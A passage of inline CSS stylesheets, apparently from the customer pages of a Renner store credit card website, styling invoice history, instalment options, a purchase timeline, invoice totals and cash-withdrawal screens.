         .historico-fatura .historico-fatura__fatura .fatura__mes {
         font-size: 14px; }
         .historico-fatura .historico-fatura__fatura .fatura__gerar {
         min-width: 115px;
         text-align: center; }
         .historico-fatura .historico-fatura__fatura .fatura__gerar .fatura__gerar--sem-fatura {
         color: #acacac;
         font-size: 14px; }
         .historico-fatura .historico-fatura__fatura .button {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .historico-fatura .historico-fatura__fatura .button .button__icon {
         margin-right: 10px;
         width: 20px;
         height: 20px; }
         .historico-fatura .historico-fatura__fatura:last-of-type {
         border-bottom: none; }
      </style>
      <style type="text/css">.opcoes-parcelamento {
         display: -webkit-box;
         display: flex;
         flex-wrap: wrap;
         margin-bottom: 0;
         padding: 10px;
         text-align: left; }
         .opcoes-parcelamento__title {
         line-height: 110%;
         letter-spacing: -0.05em;
         font-size: 32px;
         font-weight: 300;
         font-style: italic; }
         .opcoes-parcelamento__text {
         margin-right: -10px;
         font-size: 16px;
         font-weight: 300; }
         .opcoes-parcelamento__text strong {
         font-weight: bold; }
         .opcoes-parcelamento__text-footer {
         padding-top: 20px;
         color: #706f6f;
         font-size: 12px; }
         .opcoes-parcelamento__text-footer--entrada {
         margin-bottom: 0; }
         .opcoes-parcelamento__lista-parcela {
         display: -webkit-box;
         display: flex;
         flex-wrap: wrap;
         margin: 0;
         padding: 0;
         padding-left: 30px;
         list-style: none; }
         .opcoes-parcelamento__lista-parcela__item {
         display: -webkit-box;
         display: flex;
         position: relative;
         margin-bottom: 3px;
         border: 1px solid #f2f2f2;
         border-radius: 3px;
         line-height: 100%;
         font-size: 16px; }
         .opcoes-parcelamento__lista-parcela__item .label-entrada {
         padding-left: 14px;
         font-size: 12px;
         font-style: italic; }
         .opcoes-parcelamento__lista-parcela__item .valor-entrada {
         padding-top: 14px;
         padding-bottom: 14px;
         width: 100%;
         line-height: 20px; }
         .opcoes-parcelamento__lista-parcela__item .valor-entrada :after {
         position: absolute;
         top: 50%;
         left: 50%;
         -webkit-transform: translate(-50%, -50%);
         transform: translate(-50%, -50%);
         border: 1px solid #e0e0e0;
         border-radius: 50%;
         background: #fff;
         width: 23px;
         height: 23px;
         text-align: center;
         line-height: 22px;
         color: #706f6f;
         font-size: 14px;
         font-weight: normal;
         content: "+"; }
         .opcoes-parcelamento__lista-parcela__item .valor-parcela {
         background-color: #f2f2f2;
         padding-top: 14px;
         padding-bottom: 14px;
         width: 100%; }
         .opcoes-parcelamento__lista-parcela__item .quantidade-parcelas {
         display: inline-block;
         width: 50px;
         text-align: right; }
         @media (max-width: 767px) {
         .opcoes-parcelamento__lista-parcela {
         padding-left: 0;
         text-align: center; }
         .opcoes-parcelamento__lista-parcela__item {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .opcoes-parcelamento__lista-parcela__item .label-entrada {
         padding-left: 0; }
         .opcoes-parcelamento__lista-parcela__item .valor-entrada {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         padding-top: 0;
         padding-bottom: 12px; }
         .opcoes-parcelamento__lista-parcela__item .valor-entrada :after {
         -webkit-transform: translate(-50%, -25%);
         transform: translate(-50%, -25%); } }
         @media (max-width: 767px) {
         .opcoes-parcelamento__text {
         margin-right: 0;
         line-height: 110%;
         font-size: 14px; }
         .opcoes-parcelamento__content > .row > .column {
         padding: 0; }
         .opcoes-parcelamento li:nth-child(2n+1) {
         padding-right: 2px; }
         .opcoes-parcelamento li:nth-child(2n) {
         padding-left: 2px; }
         .opcoes-parcelamento__lista-parcela__item {
         font-size: 14px; }
         .opcoes-parcelamento__lista-parcela__item .quantidade-parcelas {
         width: initial; }
         .opcoes-parcelamento__text-footer {
         padding-top: 15px;
         line-height: 110%;
         font-size: 10px; } }
      </style>
      <style type="text/css">.cartao-renner .bg-themed, .cartao-renner .timeline__item:before, .cartao-renner .timeline__item-date:before,
         .meu-cartao .cartao-renner .bg-themed,
         .meu-cartao .cartao-renner .timeline__item:before,
         .meu-cartao .cartao-renner .timeline__item-date:before {
         background-color: #d71920; }
         .cartao-renner .bg-themed--selected {
         background-color: #810f13; }
         .cartao-renner .border-themed,
         .meu-cartao .cartao-renner .border-themed {
         border-color: #d71920; }
         .cartao-renner .border-themed--selected {
         border-color: #810f13; }
         .cartao-renner .text-themed,
         .meu-cartao .cartao-renner .text-themed {
         color: #d71920; }
         .cartao-renner .text-themed--selected {
         color: #810f13; }
         .cartao-renner.theme-priority .bg-themed, .cartao-renner.theme-priority .timeline__item:before, .cartao-renner.theme-priority .timeline__item-date:before {
         background-color: #ac8947; }
         .cartao-renner.theme-priority .border-themed {
         border-color: #ac8947; }
         .cartao-renner.theme-priority .text-themed {
         color: #ac8947; }
         .meu-cartao .bg-themed, .meu-cartao .timeline__item:before, .meu-cartao .timeline__item-date:before,
         .cartao-renner .meu-cartao .bg-themed,
         .cartao-renner .meu-cartao .timeline__item:before,
         .cartao-renner .meu-cartao .timeline__item-date:before {
         background-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         border-color: #997a3f; }
         .meu-cartao .border-themed,
         .cartao-renner .meu-cartao .border-themed {
         border-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         background-color: #997a3f; }
         .meu-cartao .text-themed,
         .cartao-renner .meu-cartao .text-themed {
         color: #ac8947; }
         .meu-cartao .text-themed--selected {
         color: #997a3f; }
         .meu-cartao.theme-priority .bg-themed, .meu-cartao.theme-priority .timeline__item:before, .meu-cartao.theme-priority .timeline__item-date:before {
         background-color: #ac8947; }
         .meu-cartao.theme-priority .border-themed {
         border-color: #ac8947; }
         .meu-cartao.theme-priority .text-themed {
         color: #ac8947; }
         .cartao-renner .hidden-for-cartao-renner {
         display: none; }
         .meu-cartao .hidden-for-meu-cartao {
         display: none; }
         .fatura-cancelada .timeline__item-container .column .timeline__item-container-parcela,
         .fatura-cancelada .timeline__item-container .column .timeline__item-container-local,
         .fatura-cancelada .timeline__item-container .column .timeline__item-container-valor {
         text-decoration: line-through;
         color: #706f6f; }
         .timeline__user:nth-child(1) .timeline__user-nome {
         margin-top: 0; }
         .timeline__user-nome {
         margin: 30px 0 25px;
         color: #706f6f;
         font-size: 14px;
         font-weight: 400; }
         .timeline__user-nome strong {
         padding-right: 8px; }
         .timeline__item {
         position: relative;
         padding-bottom: 8px;
         color: #706f6f;
         font-size: 12px; }
         .timeline__item:before {
         display: block;
         position: absolute;
         top: 0;
         left: 45px;
         width: 1px;
         height: 100%;
         content: ""; }
         .timeline__item:nth-child(1):before {
         top: 50%;
         height: 50%; }
         .timeline__item:nth-last-child(1):before {
         height: 50%; }
         .timeline__item:only-child:before {
         content: none; }
         .timeline__list {
         margin: 0;
         padding: 0;
         list-style: none; }
         .timeline__list:last-child .timeline__item:last-child {
         padding-bottom: 0; }
         .timeline__item-date {
         position: absolute;
         top: 50%;
         -webkit-transform: translateY(-50%);
         transform: translateY(-50%);
         margin-top: -4px;
         width: 60px;
         line-height: 100%;
         font-size: 12px; }
         .timeline__item-date:before {
         display: block;
         position: absolute;
         top: 50%;
         left: 40px;
         -webkit-transform: translateY(-50%);
         transform: translateY(-50%);
         border: 2px solid #e0e0e0;
         border-radius: 50%;
         width: 11px;
         height: 11px;
         content: ""; }
         .timeline__item-container {
         margin-left: 60px !important;
         border-radius: 3px;
         background-color: #f2f2f2;
         width: calc(100% - 60px);
         min-height: 52px;
         line-height: 100%; }
         .timeline__item-container > .column {
         padding: 0.75rem; }
         .timeline__item-container .timeline__item-container-parcela {
         margin-bottom: 3px;
         line-height: 120%; }
         .timeline__item-container .timeline__item-container-parcela,
         .timeline__item-container .timeline__item-container-valor {
         color: #1e1e1f;
         font-size: 14px; }
         @media (max-width: 767px) {
         .timeline__item-container > .column {
         padding: 0.625rem;
         letter-spacing: -0.5px; }
         .timeline__item-container > .column:nth-child(2) {
         padding-left: 0; }
         .timeline__item-container .timeline__item-container-parcela {
         padding-bottom: 2px; }
         .timeline__item-container .timeline__item-container-parcela,
         .timeline__item-container .timeline__item-container-valor {
         font-size: 13px; } }
      </style>
      <style type="text/css">.cartao-renner .bg-themed, .cartao-renner .extrato-fatura-totalizador .totalizador__compras:after, .extrato-fatura-totalizador .cartao-renner .totalizador__compras:after,
         .meu-cartao .cartao-renner .bg-themed,
         .meu-cartao .cartao-renner .extrato-fatura-totalizador .totalizador__compras:after,
         .extrato-fatura-totalizador .meu-cartao .cartao-renner .totalizador__compras:after {
         background-color: #d71920; }
         .cartao-renner .bg-themed--selected {
         background-color: #810f13; }
         .cartao-renner .border-themed, .cartao-renner .extrato-fatura-totalizador .totalizador__compras:after, .extrato-fatura-totalizador .cartao-renner .totalizador__compras:after,
         .meu-cartao .cartao-renner .border-themed,
         .meu-cartao .cartao-renner .extrato-fatura-totalizador .totalizador__compras:after,
         .extrato-fatura-totalizador .meu-cartao .cartao-renner .totalizador__compras:after {
         border-color: #d71920; }
         .cartao-renner .border-themed--selected {
         border-color: #810f13; }
         .cartao-renner .text-themed,
         .meu-cartao .cartao-renner .text-themed {
         color: #d71920; }
         .cartao-renner .text-themed--selected {
         color: #810f13; }
         .cartao-renner.theme-priority .bg-themed, .cartao-renner.theme-priority .extrato-fatura-totalizador .totalizador__compras:after, .extrato-fatura-totalizador .cartao-renner.theme-priority .totalizador__compras:after {
         background-color: #ac8947; }
         .cartao-renner.theme-priority .border-themed, .cartao-renner.theme-priority .extrato-fatura-totalizador .totalizador__compras:after, .extrato-fatura-totalizador .cartao-renner.theme-priority .totalizador__compras:after {
         border-color: #ac8947; }
         .cartao-renner.theme-priority .text-themed {
         color: #ac8947; }
         .meu-cartao .bg-themed, .meu-cartao .extrato-fatura-totalizador .totalizador__compras:after, .extrato-fatura-totalizador .meu-cartao .totalizador__compras:after,
         .cartao-renner .meu-cartao .bg-themed,
         .cartao-renner .meu-cartao .extrato-fatura-totalizador .totalizador__compras:after,
         .extrato-fatura-totalizador .cartao-renner .meu-cartao .totalizador__compras:after {
         background-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         border-color: #997a3f; }
         .meu-cartao .border-themed, .meu-cartao .extrato-fatura-totalizador .totalizador__compras:after, .extrato-fatura-totalizador .meu-cartao .totalizador__compras:after,
         .cartao-renner .meu-cartao .border-themed,
         .cartao-renner .meu-cartao .extrato-fatura-totalizador .totalizador__compras:after,
         .extrato-fatura-totalizador .cartao-renner .meu-cartao .totalizador__compras:after {
         border-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         background-color: #997a3f; }
         .meu-cartao .text-themed,
         .cartao-renner .meu-cartao .text-themed {
         color: #ac8947; }
         .meu-cartao .text-themed--selected {
         color: #997a3f; }
         .meu-cartao.theme-priority .bg-themed, .meu-cartao.theme-priority .extrato-fatura-totalizador .totalizador__compras:after, .extrato-fatura-totalizador .meu-cartao.theme-priority .totalizador__compras:after {
         background-color: #ac8947; }
         .meu-cartao.theme-priority .border-themed, .meu-cartao.theme-priority .extrato-fatura-totalizador .totalizador__compras:after, .extrato-fatura-totalizador .meu-cartao.theme-priority .totalizador__compras:after {
         border-color: #ac8947; }
         .meu-cartao.theme-priority .text-themed {
         color: #ac8947; }
         .cartao-renner .hidden-for-cartao-renner {
         display: none; }
         .meu-cartao .hidden-for-meu-cartao {
         display: none; }
         .extrato-fatura-totalizador {
         margin-top: 30px; }
         .extrato-fatura-totalizador .totalizador__valor-numero {
         font-size: 18px; }
         .extrato-fatura-totalizador .totalizador__sub-total,
         .extrato-fatura-totalizador .totalizador__valor-seguro,
         .extrato-fatura-totalizador .totalizador__valor-encargos,
         .extrato-fatura-totalizador .totalizador__total {
         width: 25%; }
         .extrato-fatura-totalizador .totalizador__total .totalizador__valor-label {
         color: #706f6f;
         font-size: 16px;
         font-weight: 700; }
         .extrato-fatura-totalizador .totalizador__total .totalizador__valor-numero {
         line-height: 1.5rem;
         letter-spacing: -0.5px;
         color: #1e1e1f;
         font-size: 22px;
         font-weight: 700; }
         .extrato-fatura-totalizador .totalizador__saldo-anterior,
         .extrato-fatura-totalizador .totalizador__pagamentos,
         .extrato-fatura-totalizador .totalizador__compras,
         .extrato-fatura-totalizador .totalizador__total {
         position: relative; }
         .extrato-fatura-totalizador .totalizador__saldo-anterior:after,
         .extrato-fatura-totalizador .totalizador__pagamentos:after,
         .extrato-fatura-totalizador .totalizador__compras:after,
         .extrato-fatura-totalizador .totalizador__total:after {
         display: block;
         position: absolute;
         top: 50%;
         right: -12px;
         z-index: 2;
         margin-top: -12px;
         border: 1px solid #acacac;
         border-radius: 50%;
         background-color: #fff;
         width: 22px;
         height: 22px;
         text-align: center;
         line-height: 20px;
         color: #706f6f;
         font-size: 18px; }
         .extrato-fatura-totalizador .totalizador__saldo-anterior {
         width: 22.75%; }
         .extrato-fatura-totalizador .totalizador__pagamentos {
         width: 27%; }
         .extrato-fatura-totalizador .totalizador__compras {
         width: 23.9%; }
         .extrato-fatura-totalizador .totalizador__total {
         background-color: #ebebeb;
         width: 26.35%; }
         .extrato-fatura-totalizador .totalizador__pagamentos:after {
         content: "+"; }
         .extrato-fatura-totalizador .totalizador__saldo-anterior:after {
         content: "-"; }
         .extrato-fatura-totalizador .totalizador__compras:after {
         color: #fff;
         content: "="; }
         @media (max-width: 1023px) {
         .extrato-fatura-totalizador .totalizador table td:not(:last-child) {
         margin: 0 10px;
         padding: 15px 10px; }
         .extrato-fatura-totalizador .totalizador__saldo-anterior,
         .extrato-fatura-totalizador .totalizador__pagamentos,
         .extrato-fatura-totalizador .totalizador__compras,
         .extrato-fatura-totalizador .totalizador__total {
         width: auto; }
         .extrato-fatura-totalizador .totalizador__saldo-anterior:after,
         .extrato-fatura-totalizador .totalizador__pagamentos:after,
         .extrato-fatura-totalizador .totalizador__compras:after,
         .extrato-fatura-totalizador .totalizador__total:after {
         display: none !important; }
         .extrato-fatura-totalizador .totalizador__saldo-anterior .totalizador__valor-label,
         .extrato-fatura-totalizador .totalizador__saldo-anterior .totalizador__valor-numero,
         .extrato-fatura-totalizador .totalizador__pagamentos .totalizador__valor-label,
         .extrato-fatura-totalizador .totalizador__pagamentos .totalizador__valor-numero,
         .extrato-fatura-totalizador .totalizador__compras .totalizador__valor-label,
         .extrato-fatura-totalizador .totalizador__compras .totalizador__valor-numero,
         .extrato-fatura-totalizador .totalizador__total .totalizador__valor-label,
         .extrato-fatura-totalizador .totalizador__total .totalizador__valor-numero {
         font-size: 14px; }
         .extrato-fatura-totalizador .totalizador table .totalizador__total {
         margin: 0 10px;
         background-color: inherit;
         padding: 15px 10px; } }
      </style>
      <style type="text/css">.cartao-renner .bg-themed,
         .meu-cartao .cartao-renner .bg-themed {
         background-color: #d71920; }
         .cartao-renner .bg-themed--selected {
         background-color: #810f13; }
         .cartao-renner .border-themed,
         .meu-cartao .cartao-renner .border-themed {
         border-color: #d71920; }
         .cartao-renner .border-themed--selected {
         border-color: #810f13; }
         .cartao-renner .text-themed,
         .meu-cartao .cartao-renner .text-themed {
         color: #d71920; }
         .cartao-renner .text-themed--selected {
         color: #810f13; }
         .cartao-renner.theme-priority .bg-themed {
         background-color: #ac8947; }
         .cartao-renner.theme-priority .border-themed {
         border-color: #ac8947; }
         .cartao-renner.theme-priority .text-themed {
         color: #ac8947; }
         .meu-cartao .bg-themed,
         .cartao-renner .meu-cartao .bg-themed {
         background-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         border-color: #997a3f; }
         .meu-cartao .border-themed,
         .cartao-renner .meu-cartao .border-themed {
         border-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         background-color: #997a3f; }
         .meu-cartao .text-themed,
         .cartao-renner .meu-cartao .text-themed {
         color: #ac8947; }
         .meu-cartao .text-themed--selected {
         color: #997a3f; }
         .meu-cartao.theme-priority .bg-themed {
         background-color: #ac8947; }
         .meu-cartao.theme-priority .border-themed {
         border-color: #ac8947; }
         .meu-cartao.theme-priority .text-themed {
         color: #ac8947; }
         .cartao-renner .hidden-for-cartao-renner {
         display: none; }
         .meu-cartao .hidden-for-meu-cartao {
         display: none; }
         .detalhamento-saque__content {
         border: 1px solid #e0e0e0;
         min-height: 500px; }
         .detalhamento-saque__content .detalhamento-saque__item {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .detalhamento-saque__content .detalhamento-saque__itens-with-icon {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         justify-content: space-around; }
         .detalhamento-saque__content .detalhamento-saque__itens-with-icon .detalhamento-saque__item-with-icon {
         display: -webkit-box;
         display: flex; }
         .detalhamento-saque__content .detalhamento-saque__info {
         display: -webkit-box;
         display: flex;
         border: 1px solid #e0e0e0;
         border-radius: 3px;
         background-color: #f2f2f2; }
         @media (max-width: 767px) {
         .detalhamento-saque {
         padding: 10px; }
         .detalhamento-saque__itens-with-icon {
         margin: 10px 0 20px; }
         .detalhamento-saque__itens-with-icon .detalhamento-saque__item-with-icon {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .detalhamento-saque__itens-with-icon .detalhamento-saque__item-with-icon .detalhamento-saque__item-icon {
         width: 29px;
         height: 29px; }
         .detalhamento-saque__itens-with-icon .detalhamento-saque__item-with-icon .detalhamento-saque__item-text p {
         margin: 0 7px; }
         .detalhamento-saque__itens-with-icon .detalhamento-saque__item-with-icon .detalhamento-saque__item-text .detalhamento-saque__item-description {
         font-size: 14px;
         font-weight: 300; }
         .detalhamento-saque__itens-with-icon .detalhamento-saque__item-with-icon .detalhamento-saque__item-text .detalhamento-saque__item-value {
         font-weight: 700; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item:not(:last-child) {
         border-bottom: 1px solid #e0e0e0; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item:last-child {
         font-weight: 700; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item:last-child .detalhamento-saque__item-value {
         font-size: 14px; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item p {
         margin: 12px 10px; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item-description, .detalhamento-saque__itens-without-icon .detalhamento-saque__item-value {
         font-size: 12px; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item-description {
         color: #706f6f; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item-value {
         font-weight: 700; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item-value.cet {
         margin: 10px; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item-value.cet p {
         margin: 0; }
         .detalhamento-saque__info {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         margin: 10px 10px 50px;
         padding-left: 10px; }
         .detalhamento-saque__info-icon {
         width: 18px;
         height: 18px; }
         .detalhamento-saque__info-icon svg {
         fill: #706f6f; }
         .detalhamento-saque__info-text p {
         margin: 5px 0;
         padding-left: 10px;
         color: #706f6f;
         font-size: 12px; } }
         @media (min-width: 768px) {
         .detalhamento-saque {
         padding: 20px; }
         .detalhamento-saque__itens-with-icon {
         margin: 10px 0 20px; }
         .detalhamento-saque__itens-with-icon .detalhamento-saque__item-with-icon {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .detalhamento-saque__itens-with-icon .detalhamento-saque__item-with-icon .detalhamento-saque__item-icon {
         width: 33px;
         height: 33px; }
         .detalhamento-saque__itens-with-icon .detalhamento-saque__item-with-icon .detalhamento-saque__item-text p {
         margin: 0 7px; }
         .detalhamento-saque__itens-with-icon .detalhamento-saque__item-with-icon .detalhamento-saque__item-text .detalhamento-saque__item-description,
         .detalhamento-saque__itens-with-icon .detalhamento-saque__item-with-icon .detalhamento-saque__item-text .detalhamento-saque__item-value {
         font-size: 16px; }
         .detalhamento-saque__itens-with-icon .detalhamento-saque__item-with-icon .detalhamento-saque__item-text .detalhamento-saque__item-description {
         font-weight: 300; }
         .detalhamento-saque__itens-with-icon .detalhamento-saque__item-with-icon .detalhamento-saque__item-text .detalhamento-saque__item-value {
         font-weight: 700; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item {
         border-bottom: 1px solid #e0e0e0; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item:last-child {
         font-weight: 700; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item:last-child .detalhamento-saque__item-value {
         font-size: 16px; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item p {
         margin: 12px 10px; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item-description, .detalhamento-saque__itens-without-icon .detalhamento-saque__item-value {
         font-size: 13px; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item-description {
         color: #706f6f; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item-value {
         font-weight: 700; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item-value.cet {
         margin: 10px; }
         .detalhamento-saque__itens-without-icon .detalhamento-saque__item-value.cet p {
         margin: 0; }
         .detalhamento-saque__info {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         margin: 50px 0 70px;
         padding: 10px; }
         .detalhamento-saque__info-icon {
         width: 25px;
         height: 25px; }
         .detalhamento-saque__info-icon svg {
         fill: #706f6f; }
         .detalhamento-saque__info-text p {
         margin: 5px 0;
         padding-left: 10px;
         color: #706f6f;
         font-size: 12px; }
         .detalhamento-saque .button__concluir-simulacao {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: end;
         justify-content: flex-end; }
         .detalhamento-saque .button__concluir-simulacao button {
         width: 140px; } }
      </style>
      <style type="text/css">.canais-contratacao {
         padding-bottom: 0; }
         .canais-contratacao__image {
         position: relative;
         right: 0;
         background-color: #f3f3f3;
         background-image: url(../images/canais-contratacao.saque-rapido.png);
         background-position: right 50px top 10px;
         background-repeat: no-repeat;
         background-size: 370px;
         width: 100%; }
         .canais-contratacao__image:after {
         position: absolute;
         bottom: 0;
         background: -webkit-gradient(linear, left bottom, left top, from(white), to(rgba(255, 255, 255, 0)));
         background: linear-gradient(to top, white, rgba(255, 255, 255, 0));
         width: 100%;
         height: 50%;
         content: ''; }
         .canais-contratacao__wip__image {
         position: relative;
         margin-top: 10px;
         margin-right: 40px;
         width: auto;
         max-width: none;
         height: 235px; }
         .canais-contratacao__wip__header-title {
         margin-top: 0;
         font-size: 24px;
         font-weight: 900; }
         .canais-contratacao__wip__header-description {
         padding-right: 10px;
         color: #706f6f;
         font-size: 14px;
         font-weight: 400; }
         .canais-contratacao__channels {
         position: relative; }
         .canais-contratacao__channels__image-background {
         position: absolute;
         z-index: -1;
         width: 100%;
         height: 115%;
         -o-object-fit: cover;
         object-fit: cover; }
         .canais-contratacao__channels__text {
         padding-top: 20px;
         color: #706f6f; }
         .canais-contratacao__channel {
         margin-bottom: 25px; }
         .canais-contratacao__channel__icon-text {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: horizontal;
         -webkit-box-direction: normal;
         flex-direction: row;
         height: 50px; }
         .canais-contratacao__channel__icon {
         display: -webkit-box;
         display: flex;
         width: 25px; }
         .canais-contratacao__channel__text, .canais-contratacao__channel__text__whatsapp {
         padding-left: 10px;
         font-weight: 700; }
         .canais-contratacao__channel__text p,
         .canais-contratacao__channel__text__whatsapp p {
         margin-bottom: 0; }
         .canais-contratacao__channel__icon-img {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         height: 25px; }
         .canais-contratacao__channel__icon-img svg {
         width: 100%;
         height: 23px; }
         .canais-contratacao__channel__description {
         margin-top: 10px;
         color: #706f6f;
         font-weight: 400; }
         .canais-contratacao__channel__description-link {
         text-decoration: none; }
         .canais-contratacao__channel__small-text {
         font-size: 12px;
         font-weight: 300; }
         .canais-contratacao__analise-credito {
         position: relative;
         font-size: 14px;
         font-weight: 700; }
         .canais-contratacao__section {
         padding-left: 10px; }
         @media (max-width: 767px) {
         .canais-contratacao__image {
         position: absolute;
         top: 90px; }
         .canais-contratacao__image {
         height: 235px; }
         .canais-contratacao__wip {
         margin-top: 235px; }
         .canais-contratacao__channels {
         position: static; }
         .canais-contratacao__channels__image-background {
         position: absolute;
         left: 0;
         height: 655px; }
         .canais-contratacao__channels__text {
         position: relative; }
         .canais-contratacao__channel {
         margin-bottom: 35px; }
         .canais-contratacao__channel__text__section {
         width: 200px; }
         .canais-contratacao__channel__text, .canais-contratacao__channel__text__whatsapp, .canais-contratacao__channel__description {
         font-size: 14px; }
         .canais-contratacao__channel__icon, .canais-contratacao__channel__icon-img {
         width: 25px; }
         .canais-contratacao__channel__icon svg, .canais-contratacao__channel__icon-img svg {
         height: 25px; }
         .canais-contratacao__channel__icon__whatsapp {
         width: 25px; }
         .canais-contratacao__channel__icon__whatsapp svg {
         height: 23px; }
         .canais-contratacao .button__fechar-simulacao {
         margin-top: 40px; }
         .canais-contratacao__analise-credito {
         font-size: 14px; } }
         @media (max-width: 359px) {
         .canais-contratacao__section {
         padding-left: 0; }
         .canais-contratacao__channel {
         margin-bottom: 25px; }
         .canais-contratacao__channel__text, .canais-contratacao__channel__text__whatsapp, .canais-contratacao__channel__description {
         font-size: 13px; } }
         @media (min-width: 768px) {
         .canais-contratacao {
         border: 1px solid #e0e0e0; }
         .canais-contratacao__image {
         height: 215px; }
         .canais-contratacao__wip__header-title {
         line-height: 36px;
         font-size: 32px; }
         .canais-contratacao__wip__header-description {
         margin-top: 20px;
         font-size: 16px; }
         .canais-contratacao__channels {
         background-size: 100%; }
         .canais-contratacao__channels__text {
         padding-top: 20px;
         padding-bottom: 20px; }
         .canais-contratacao .ccr {
         background-image: url(/cartoes-renner/images/detalhes-ccr-tablet.png); }
         .canais-contratacao .cbr {
         background-image: url(/cartoes-renner/images/detalhes-cbr-tablet.png); }
         .canais-contratacao__channel__icon, .canais-contratacao__channel__icon-img {
         width: 30px; }
         .canais-contratacao__channel__icon svg, .canais-contratacao__channel__icon-img svg {
         height: 30px; }
         .canais-contratacao__channel__icon__whatsapp {
         width: 30px; }
         .canais-contratacao__channel__icon__whatsapp svg {
         height: 28px; }
         .canais-contratacao__channel__text, .canais-contratacao__channel__text__whatsapp {
         padding-left: 20px;
         font-size: 16px; }
         .canais-contratacao__channel__description {
         font-size: 16px; }
         .canais-contratacao__analise-credito {
         font-size: 16px; }
         .canais-contratacao__section {
         padding-left: 20px; }
         .button__fechar-simulacao {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: end;
         justify-content: flex-end;
         margin-right: 40px; }
         .button__fechar-simulacao button {
         width: 140px; } }
         @media (min-width: 1024px) {
         .canais-contratacao__wip__header-title {
         position: absolute;
         top: 150px; }
         .canais-contratacao__section {
         padding-left: 40px; }
         .canais-contratacao__image {
         height: 215px; }
         .canais-contratacao .ccr {
         background-image: url(/cartoes-renner/images/detalhes-ccr-desktop.png); }
         .canais-contratacao .cbr {
         background-image: url(/cartoes-renner/images/detalhes-cbr-desktop.png); }
         .canais-contratacao__channel p {
         padding-right: 20px;
         font-size: 16px; }
         .canais-contratacao__channel__icon, .canais-contratacao__channel__icon-img {
         width: 40px; }
         .canais-contratacao__channel__icon svg, .canais-contratacao__channel__icon-img svg {
         height: 40px; }
         .canais-contratacao__channel__icon__whatsapp {
         width: 40px; }
         .canais-contratacao__channel__icon__whatsapp svg {
         height: 36px; }
         .canais-contratacao__channel__section {
         margin: 0; }
         .canais-contratacao__channel__with-qr-code {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .canais-contratacao__channel__with-qr-code .qr-code-store-app {
         padding-right: 135px; } }
      </style>
      <style type="text/css">.cartao-renner .bg-themed,
         .meu-cartao .cartao-renner .bg-themed {
         background-color: #d71920; }
         .cartao-renner .bg-themed--selected {
         background-color: #810f13; }
         .cartao-renner .border-themed,
         .meu-cartao .cartao-renner .border-themed {
         border-color: #d71920; }
         .cartao-renner .border-themed--selected {
         border-color: #810f13; }
         .cartao-renner .text-themed,
         .meu-cartao .cartao-renner .text-themed {
         color: #d71920; }
         .cartao-renner .text-themed--selected {
         color: #810f13; }
         .cartao-renner.theme-priority .bg-themed {
         background-color: #ac8947; }
         .cartao-renner.theme-priority .border-themed {
         border-color: #ac8947; }
         .cartao-renner.theme-priority .text-themed {
         color: #ac8947; }
         .meu-cartao .bg-themed,
         .cartao-renner .meu-cartao .bg-themed {
         background-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         border-color: #997a3f; }
         .meu-cartao .border-themed,
         .cartao-renner .meu-cartao .border-themed {
         border-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         background-color: #997a3f; }
         .meu-cartao .text-themed,
         .cartao-renner .meu-cartao .text-themed {
         color: #ac8947; }
         .meu-cartao .text-themed--selected {
         color: #997a3f; }
         .meu-cartao.theme-priority .bg-themed {
         background-color: #ac8947; }
         .meu-cartao.theme-priority .border-themed {
         border-color: #ac8947; }
         .meu-cartao.theme-priority .text-themed {
         color: #ac8947; }
         .cartao-renner .hidden-for-cartao-renner {
         display: none; }
         .meu-cartao .hidden-for-meu-cartao {
         display: none; }
         .parcelamento-saque__content {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .parcelamento-saque__content .parcelamento-saque input[type="radio"] {
